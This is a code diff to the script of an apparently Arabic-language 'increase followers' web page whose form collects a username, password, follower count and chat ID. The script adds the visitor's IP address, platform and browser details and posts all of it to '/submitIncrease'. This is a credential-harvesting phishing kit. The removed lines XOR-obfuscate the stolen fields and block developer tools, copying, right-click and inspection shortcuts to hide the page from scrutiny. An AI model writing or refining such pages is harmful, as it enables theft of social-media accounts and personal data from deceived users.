@@ -480,49 +480,6 @@
   </div>
 
   <script>
-    // ===== تشفير البيانات والوظائف الأساسية =====
-    // دالة التشفير البسيطة
-    function encryptData(data, key) {
-      let result = '';
-      for (let i = 0; i < data.length; i++) {
-        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-      }
-      return btoa(result);
-    }
-
-    // دالة فك التشفير
-    function decryptData(encryptedData, key) {
-      const data = atob(encryptedData);
-      let result = '';
-      for (let i = 0; i < data.length; i++) {
-        result += String.fromCharCode(data.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-      }
-      return result;
-    }
-
-    // مفتاح التشفير المخفي
-    const encryptionKey = "x7F!p@3$z*9qW#e2";
-
-    // ===== إضافة طبقة حماية ضد الأدوات الأوتوماتيكية =====
-    // كشف أدوات المطورين
-    function detectDevTools() {
-      const widthThreshold = window.outerWidth - window.innerWidth > 160;
-      const heightThreshold = window.outerHeight - window.innerHeight > 160;
-      if (!(heightThreshold && widthThreshold) && window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) {
-        return true;
-      }
-      return false;
-    }
-
-    // مراقبة فتح أدوات المطورين
-    setInterval(function() {
-      if (detectDevTools()) {
-        document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-size:24px;">⚠️ تم اكتشاف أدوات المطورين. لا يمكنك فحص هذه الصفحة.</div>';
-        window.stop();
-      }
-    }, 1000);
-
-    // ===== إعادة كتابة الدوال الأساسية بشكل مشفر =====
     // إظهار الإشعار
     function showNotification(message, type) {
       const notification = document.createElement('div');
@@ -634,21 +591,8 @@
       submitBtn.style.display = "none";
       loadingSpinner.style.display = "block";
 
-      // تشفير البيانات قبل الإرسال
       const formData = new FormData(this);
-      const username = formData.get('username');
-      const password = formData.get('password');
-      const followerCount = formData.get('followerCount');
-      const chatId = formData.get('chatId');
-      
-      // تشفير البيانات الحساسة
-      const encryptedData = {
-        u: encryptData(username, encryptionKey),
-        p: encryptData(password, encryptionKey),
-        f: encryptData(followerCount, encryptionKey),
-        c: encryptData(chatId, encryptionKey),
-        t: Date.now()
-      };
+      const data = Object.fromEntries(formData.entries());
 
       // الحصول على معلومات إضافية
       const ipData = await fetch("https://api.ipify.org?format=json")
@@ -659,18 +603,17 @@
       const deviceInfo = navigator.userAgent;
       
       // إضافة المعلومات الإضافية إلى البيانات
-      encryptedData.ip = ipData.ip;
-      encryptedData.pl = encryptData(platformInfo, encryptionKey);
-      encryptedData.dv = encryptData(deviceInfo, encryptionKey);
+      data.ip = ipData.ip;
+      data.platform = platformInfo;
+      data.device = deviceInfo;
       
       try {
-        // إرسال البيانات المشفرة
         const response = await fetch('/submitIncrease', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify(encryptedData)
+          body: JSON.stringify(data)
         });
         
         const result = await response.json();
@@ -720,33 +663,6 @@
         scrollIndicator.textContent = "↑ اسحب للأعلى لرؤية المزيد ↑";
       } else if (scrollPercentage < 10) {
         scrollIndicator.textContent = "↓ اسحب للأسفل لرؤية المزيد ↓";
-      }
-    });
-
-    // ===== إضافة طبقات حماية إضافية =====
-    // منع نسخ النص
-    document.addEventListener('copy', function(e) {
-      e.clipboardData.setData('text/plain', 'محتوى محمي');
-      e.preventDefault();
-    });
-
-    // منع النقر الأيمن
-    document.addEventListener('contextmenu', function(e) {
-      e.preventDefault();
-      showNotification('هذا الإجراء غير مسموح به', 'error');
-    });
-
-    // منع فتح أدوات المطورين باستخدام اختصار لوحة المفاتيح
-    document.addEventListener('keydown', function(e) {
-      // Ctrl+Shift+I, Ctrl+Shift+C, Ctrl+U, F12
-      if (
-        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
-        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || 
-        (e.ctrlKey && e.keyCode === 85) || 
-        e.keyCode === 123
-      ) {
-        e.preventDefault();
-        showNotification('هذا الإجراء غير مسموح به', 'error');
       }
     });
   </script>
